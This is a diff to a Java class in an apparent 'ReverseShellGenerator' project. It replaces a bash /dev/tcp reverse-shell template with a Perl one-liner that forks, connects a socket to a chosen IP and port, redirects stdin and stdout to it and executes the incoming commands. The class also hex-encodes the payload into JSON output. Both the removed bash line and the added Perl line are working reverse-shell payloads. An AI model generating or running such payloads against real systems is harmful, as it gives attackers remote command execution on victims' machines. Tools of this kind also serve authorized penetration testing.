@@ -2,12 +2,13 @@ package com.iteso.ReverseShellGenerator.Reverse.Shells;
 import com.iteso.ReverseShellGenerator.DEncoder;
 import com.iteso.ReverseShellGenerator.Reverse.Reverse;
 
-public class Bash_i extends Reverse{
+public class Perlnosh extends Reverse {
+
     protected String shellFormat = "";
 
-    public Bash_i(String localIP, int localPort, LISTENER listener, SHELLS shellType){
+    public Perlnosh(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("\n%s -i >& /dev/tcp/%s/%s 0>&1\n", this.getShell(), this.getLocalIP(), this.getLocalPort());
+        shellFormat = String.format("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\\\"%s:%s\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",this.getLocalIP(), this.getLocalPort());
     }
 
     @Override
@@ -24,4 +25,6 @@ public class Bash_i extends Reverse{
                     "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                 "}";
     }
-}
+    
+} 
+    
